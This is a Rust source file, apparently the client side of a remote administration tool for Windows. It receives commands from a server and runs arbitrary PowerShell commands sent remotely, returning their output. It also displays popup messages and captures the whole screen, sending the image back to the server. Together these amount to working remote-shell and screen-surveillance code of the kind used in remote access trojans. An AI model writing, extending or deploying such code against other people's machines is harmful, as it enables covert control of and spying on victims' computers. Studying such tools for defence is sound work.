
use std::ffi::{c_void, CString};
use std::process;
use std::process::Stdio;
use std::time::Duration;
use windows::core::{PCSTR, PCWSTR, s};
use windows::Win32::Foundation::HWND;
use windows::Win32::Graphics::Gdi::{BI_RGB, BitBlt, BITMAPINFO, BITMAPINFOHEADER, CAPTUREBLT, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject, DIB_RGB_COLORS, GetDC, GetDIBits, ReleaseDC, SelectObject, SRCCOPY, RGBQUAD};
use windows::Win32::UI::WindowsAndMessaging::{
    GetSystemMetrics, MB_ICONINFORMATION, MB_OK, MessageBoxA, SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN,
    SM_XVIRTUALSCREEN, SM_YVIRTUALSCREEN
};
use lib::{Command, send_data, Payload};
use lib::Command::Message;
use crate::Client;


/// Parses the byte buffer into a String then runs the given command
pub fn parse_message(client: &mut Client, command: Command, buf: Vec<u8>) {
    // TODO: remove unwrap
    let message = serde_json::from_slice(&buf).unwrap();

    match command {
        Command::Run => run(client, message),
        Command::Echo => echo(client, message),
        Command::Send => receive(client, message),
        Command::Message => display_message(client, message),
        Command::Screenshot => screenshot(client),
        _ => log::debug!("Command not implemented"),
    }
}

pub fn receive(client: &mut Client, message: String) {
    log::trace!("Message received from server: {}", message);
    send_data(Command::Send, &(), &mut client.writer).unwrap()
}

pub fn run(client: &mut Client, command: String) {
    let output = process::Command::new("powershell")
        .args(["-Command", &command])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    let response = match output {
        Ok(output) => {
            if output.status.success() {
                log::trace!("Command: {}. Successful command run {}", command, String::from_utf8_lossy(&output.stdout).to_string());
                format!("Command executed successfully.\nResponse:\n{}", String::from_utf8(output.stdout).unwrap())
            } else {
                log::trace!("Command: {}. Unsuccessful command run {}", command, String::from_utf8_lossy(&output.stderr).to_string());
                format!("Command returned an error. Error message:\n{}", String::from_utf8(output.stderr).unwrap())
            }
        },
        Err(err) => format!("An error occurred while running command: {}", err),
    };
    
    send_data(Command::Send, &response, &mut client.writer).unwrap()
}

pub fn echo(client: &mut Client, message: String) {
    log::debug!("Received message: {}", message);
    if send_data(Command::Send, &message, &mut client.writer).is_ok() {
        log::info!("Successfully echoed data back to server");
    }
    else {
        log::error!("An error occurred while echoing data to server");
    }
}


/// Displays a popup message box on the client machine
pub fn display_message(client: &mut Client, message: String) {
    let c_message = std::ffi::CString::new(message).unwrap();
    let title = std::ffi::CString::new("Message").unwrap();
    unsafe {
        MessageBoxA(
            HWND(0 as *mut c_void),
            PCSTR(c_message.as_ptr() as *const u8),
            PCSTR(title.as_ptr() as *const u8),
            MB_OK | MB_ICONINFORMATION,
        );
    }
    // Send an empty response to server to indicate success
    lib::send_data(lib::Command::Send, &"", &mut client.writer).unwrap();
}

/// Captures the entire virtual screen and sends it back to the server as raw BMP data
pub fn screenshot(client: &mut Client) {
    unsafe {
        let width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        let height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        let x = GetSystemMetrics(SM_XVIRTUALSCREEN);
        let y = GetSystemMetrics(SM_YVIRTUALSCREEN);

        let dc_screen = GetDC(None);
        let dc_target = CreateCompatibleDC(dc_screen);
        let bmp_handle = CreateCompatibleBitmap(dc_screen, width, height);
        SelectObject(dc_target, bmp_handle);

        BitBlt(dc_target, 0, 0, width, height, dc_screen, x, y, SRCCOPY | CAPTUREBLT);

        // Prepare BITMAPINFO for GetDIBits
        let mut bi = BITMAPINFO {
            bmiHeader: BITMAPINFOHEADER {
                biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
                biWidth: width,
                biHeight: height,
                biPlanes: 1,
                biBitCount: 24,
                biCompression: BI_RGB.0,
                biSizeImage: 0,
                biXPelsPerMeter: 0,
                biYPelsPerMeter: 0,
                biClrUsed: 0,
                biClrImportant: 0,
            },
            bmiColors: [RGBQUAD { rgbBlue: 0, rgbGreen: 0, rgbRed: 0, rgbReserved: 0 }; 1],
        };

        let bmp_size = ((width * 3 + 3) & !3) * height;
        let mut buf = vec![0u8; bmp_size as usize];

            GetDIBits(
                dc_target,
                bmp_handle,
                0,
                height as u32,
                Some(buf.as_mut_ptr() as *mut std::ffi::c_void),
                &mut bi,
                DIB_RGB_COLORS
            );


        // Construct BMP file header and info header for a 24-bit BMP
        let file_size = 54 + buf.len() as u32; // 54-byte header + data
        let mut bmp_file = Vec::with_capacity(file_size as usize);

        // BITMAPFILEHEADER
        bmp_file.extend_from_slice(&[0x42, 0x4D]); // 'BM'
        bmp_file.extend_from_slice(&file_size.to_le_bytes());
        bmp_file.extend_from_slice(&[0u8;4]); // Reserved
        bmp_file.extend_from_slice(&54u32.to_le_bytes()); // Offset to pixel data (54 bytes)

        // BITMAPINFOHEADER
        bmp_file.extend_from_slice(&bi.bmiHeader.biSize.to_le_bytes());
        bmp_file.extend_from_slice(&bi.bmiHeader.biWidth.to_le_bytes());
        bmp_file.extend_from_slice(&bi.bmiHeader.biHeight.to_le_bytes());
        bmp_file.extend_from_slice(&bi.bmiHeader.biPlanes.to_le_bytes());
        bmp_file.extend_from_slice(&bi.bmiHeader.biBitCount.to_le_bytes());
        bmp_file.extend_from_slice(&bi.bmiHeader.biCompression.to_le_bytes());
        bmp_file.extend_from_slice(&(bmp_size as u32).to_le_bytes());
        bmp_file.extend_from_slice(&bi.bmiHeader.biXPelsPerMeter.to_le_bytes());
        bmp_file.extend_from_slice(&bi.bmiHeader.biYPelsPerMeter.to_le_bytes());
        bmp_file.extend_from_slice(&bi.bmiHeader.biClrUsed.to_le_bytes());
        bmp_file.extend_from_slice(&bi.bmiHeader.biClrImportant.to_le_bytes());

        // Pixel data
        bmp_file.extend_from_slice(&buf);

        DeleteObject(bmp_handle);
        DeleteDC(dc_target);
        ReleaseDC(None, dc_screen);

        // Send BMP file bytes to server
        lib::send_data(lib::Command::Send, &bmp_file, &mut client.writer).unwrap();
    }
}